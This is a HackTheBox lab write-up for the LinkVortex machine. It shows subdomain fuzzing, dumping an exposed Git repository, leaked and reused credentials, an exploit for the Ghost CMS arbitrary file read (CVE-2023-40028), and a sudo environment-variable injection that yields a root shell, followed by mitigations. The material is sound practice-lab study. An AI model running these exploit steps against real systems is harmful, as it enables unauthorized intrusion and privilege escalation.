---
title: "LinkVortex"
date: 2025-04-12 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Arbitrary-File-Read, CVE-2023-40028, Command-Injection, Ghost-CMS, Git-Exposure, Subdomain-Fuzzing, Symlink-Abuse]
description: Writeup for HackTheBox LinkVortex machine
image:
  path: assets/img/linkvortex/linkvortex.png
  alt: HTB LinkVortex
---
## Executive Summary

LinkVortex is an easy-difficulty Linux machine on HackTheBox that features a vulnerable instance of Ghost CMS, source code exposure via Git, and a privilege escalation vector through command injection in a privileged bash script.

The intrusion begins with a service scan of port 80/tcp, which redirects to `http://linkvortex.htb/`. Initial directory brute-forcing reveals a `/ghost` endpoint. Concurrently, subdomain fuzzing uncovers the virtual host `dev.linkvortex.htb`. Inspecting the `dev` subdomain reveals that Git history was left exposed, allowing the retrieval of the project repository via `git-dumper`. A review of the source code and Git logs exposes a hardcoded staging password and the administrative email domain, which grants access to the Ghost CMS administrative dashboard at `http://linkvortex.htb/ghost/`.

Upon authentication, the Ghost CMS version is identified as `5.58.0`, which is vulnerable to CVE-2023-40028, an arbitrary file read exploit. Exploiting this vulnerability allows reading `/var/lib/ghost/config.production.json`, leaking the mail configuration containing credentials for the user `bob`. These credentials facilitate SSH access to the machine.

For privilege escalation, the user `bob` is authorized to run a custom cleanup script `/opt/ghost/clean_symlink.sh` via `sudo` without a password. The script accepts a wildcard parameter (`*.png`) and executes the contents of the `CHECK_CONTENT` environment variable as a command when set. By exporting `CHECK_CONTENT` with a shell execution payload and running the script with sudo, arbitrary commands are executed as root, leading to full system compromise.

## Reconnaissance

The first step is to start with an Nmap scan.

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.11.47  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 10:50 EST
Nmap scan report for 10.10.11.47
Host is up (1.6s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.85 seconds
```
To get a complete overview, we use a default script scan and a service version scan.


```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.11.47   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 10:52 EST
Nmap scan report for 10.10.11.47
Host is up (0.73s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/12%OT=22%CT=1%CU=43535%PV=Y%DS=2%DC=T%G=Y%TM=67AC
OS:C41C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=D)SEQ(S
OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI
OS:=Z%II=I%TS=B)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST
OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=
OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   711.68 ms 10.10.16.1
2   357.21 ms 10.10.11.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.68 seconds
```                                          

The scan shows **two open ports**: `22/tcp` — OpenSSH 8.9p1 (Ubuntu) and `80/tcp` — Apache HTTPD redirecting to `http://linkvortex.htb/`. The host is Linux (Ubuntu). Further enumeration will focus on the web application and subdomain discovery.

To ensure our system resolves both domains, we add them to `/etc/hosts`:

```shell
sudo sh -c 'echo "10.10.11.47 linkvortex.htb dev.linkvortex.htb" >> /etc/hosts'
```

Next, we run Dirsearch for directory discovery:

```shell
dirsearch -u "http://linkvortex.htb" -t 50 -i 200
```

The scan reveals several files including `robots.txt`, which contains:

```text
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

The `/ghost/` path hints at **Ghost CMS**, a popular Node.js blogging platform. Visiting `http://linkvortex.htb/ghost` presents a signup/login page, confirming Ghost is in use. Without credentials, we turn to subdomain enumeration:

```shell
wfuzz -c -w subdomains-top1mil-20000.txt -H "Host: FUZZ.linkvortex.htb" --sc 200 http://linkvortex.htb/
```

One subdomain responds:

```
000000019:   200        115 L    255 W      2538 Ch     "dev"
```

The `dev` subdomain is a staging instance — and crucially, it exposes its `.git` directory, leaking the full project history.

### Git Repository Dump

We use `git-dumper` to download the entire exposed repository from `dev.linkvortex.htb`:

```shell
git-dumper http://dev.linkvortex.htb/ linkvortex-ghost
```

This fetches the full Git history. Digging through the code, we find a developer test file containing hardcoded credentials:

```shell
cat linkvortex-ghost/ghost/core/test/regression/api/admin/authentication.test.js
```

```javascript
it('complete setup', async function () {
    const email = 'test@example.com';
    const password = 'OctopiFociPilfer45';
    // ...
```

The email in the test is a placeholder (`test@example.com`), but we can determine the real email domain from the Git commit logs:

```shell
cat linkvortex-ghost/.git/logs/HEAD
```

```
root <dev@linkvortex.htb> 1730322603 +0000    clone: from https://github.com/TryGhost/Ghost.git
```

The commit author uses `@linkvortex.htb`, so the admin email follows the same pattern. We now have working credentials:

```
admin@linkvortex.htb / OctopiFociPilfer45
```

Login: [http://linkvortex.htb/ghost/#/signin](http://linkvortex.htb/ghost/#/signin)

Once logged in, the Ghost admin dashboard reveals the version under Settings &rarr; About:

```
Version: 5.58.0
Environment: production
```

### CVE-2023-40028 — Arbitrary File Read

Ghost 5.58.0 is vulnerable to **CVE-2023-40028**, an authenticated arbitrary file read. The exploit works by packaging a malicious symlink inside a crafted theme ZIP. When Ghost processes the uploaded theme, it follows the symlink and returns the contents of arbitrary files on the filesystem.

We use a public exploit script:

```shell
./exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
```

This provides an interactive shell for reading files. We can verify the exploit works by reading `/etc/passwd`, but our real target is the Ghost configuration file.

From the dumped Git repository, a `Dockerfile.ghost` reveals the config path:

```dockerfile
COPY config.production.json /var/lib/ghost/config.production.json
```

We target this file:

```
Enter the file path to read: /var/lib/ghost/config.production.json
```

The config contains SMTP credentials — but more importantly, these credentials are reused for the system user `bob`:

```json
"mail": {
    "transport": "SMTP",
    "options": {
        "service": "Google",
        "host": "linkvortex.htb",
        "port": 587,
        "auth": {
            "user": "bob@linkvortex.htb",
            "pass": "fibber-talented-worth"
        }
    }
}
```

### SSH Access — User Flag

The password `fibber-talented-worth` is reused for the system user `bob`. We SSH in:

```shell
ssh bob@linkvortex.htb
bob@linkvortex.htb's password: [fibber-talented-worth]

bob@linkvortex:~$ cat user.txt
************3e5ce5f69ec942e47fdc
```

## Privilege Escalation

Checking `bob`'s sudo privileges reveals an interesting configuration:

```shell
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=..., use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Two things stand out:

1. **`env_keep+=CHECK_CONTENT`** — The `CHECK_CONTENT` environment variable is preserved through sudo.
2. **Wildcard `*.png`** — The script accepts any `.png` argument and runs as root.

### Analyzing `clean_symlink.sh`

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

The critical vulnerability is on this line:

```bash
if $CHECK_CONTENT;then
```

Because `CHECK_CONTENT` is preserved in the sudo environment (`env_keep+=CHECK_CONTENT`), and the script evaluates it directly as a command rather than comparing it as a string (e.g., `[ "$CHECK_CONTENT" = "true" ]`), we can inject arbitrary commands.

### Exploiting the Script

We need to satisfy three conditions:

| Condition | Check | Bypass |
|-----------|-------|--------|
| Argument must end in `.png` | Line 8: `[[ "$LINK" =~ \.png$ ]]` | Name our file `exploit.png` |
| Must be a symlink | Line 11: `test -L $LINK` | Create with `ln -s` |
| Target must not contain `etc` or `root` | Line 14: `grep -Eq '(etc\|root)'` | Point symlink to `/bin/bash` |

The exploit:

```shell
# Step 1: Create a symlink pointing to /bin/bash (no "etc" or "root" in path)
ln -s /bin/bash exploit.png

# Step 2: Set CHECK_CONTENT to spawn a root shell
export CHECK_CONTENT="/bin/bash"

# Step 3: Run the script with sudo
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
```

**Execution flow:**

1. The script verifies `exploit.png` is a symlink — passes.
2. `readlink` resolves it to `/bin/bash` — no `etc` or `root`, bypasses the grep filter.
3. The script moves `exploit.png` to `/var/quarantined/`.
4. On line 21, `if $CHECK_CONTENT;then` becomes `if /bin/bash;then` — which spawns an interactive **root shell**.

```shell
Link found [ exploit.png ] , moving it to quarantine
root@linkvortex:/home/bob# cat /root/root.txt
************31738aa9b53bb8afeb00
```

## Mitigations & Security Recommendations

1. **Protect Git Metadata and Directories**:
   - Do not expose the `.git` directory on production or staging web applications. Configure the web server (Apache/Nginx) to block access to directory paths starting with or containing `.git`.
   - Implement automated checks in CI/CD pipelines to ensure hidden configuration files or metadata directories are excluded from deployment builds.

2. **Patch and Update CMS Implementations**:
   - Ensure CMS platforms like Ghost are updated regularly. In LinkVortex, updating Ghost CMS to a version newer than 5.58.0 mitigates CVE-2023-40028 (arbitrary file read).

3. **Secure Custom Privileged Scripts**:
   - Avoid using dynamic environment variables as commands inside administrative scripts. Explicitly validate variables against strict allowlists instead of directly executing them (e.g., `$CHECK_CONTENT`).
   - If an environment variable controls script pathways, use robust conditional checks (e.g., `if [ "$CHECK_CONTENT" = "true" ]`) and run predefined, hardcoded binaries instead of evaluating user-controlled values.

4. **Apply the Principle of Least Privilege**:
   - Avoid wildcard arguments in the `/etc/sudoers` file (e.g., `*.png`) that can be manipulated by local users.
   - Run security audits on custom helper scripts configured to execute as root to verify that they do not introduce shell escapes, input injection points, or privilege escalation vectors.
